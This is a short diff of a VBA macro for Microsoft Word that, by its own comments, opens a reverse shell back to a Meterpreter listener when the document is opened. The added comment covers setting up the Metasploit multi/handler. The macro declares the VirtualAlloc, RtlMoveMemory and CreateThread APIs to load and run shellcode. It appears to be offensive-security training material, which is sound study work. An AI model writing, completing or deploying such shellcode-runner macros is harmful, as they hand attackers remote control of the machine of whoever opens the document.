@@ -4,6 +4,7 @@
 ' When a word document (or another application of your choice) opens with this macro
 ' enabled. It will call back to our meterpreter listener with a reverse shell.
 ' Keep in mind this shell will only be active as long as the application is running.
+' Make sure we have a 32-bit multi/handler in Metasploit with exitfunc set to "thread to catch the shell"
 
 Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ' The VirtualAlloc API allows us to allocate memory or our shellcode
 (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal 
@@ -16,7 +17,7 @@ Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32"
 
 ' We will run the shellcode with CreateThread
 
-Private Declare PtrSafe Function CreateThread Lib "Kernel32" (ByVal SecurityAttributes As Long, 
+  Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, 
  ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal 
  CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 
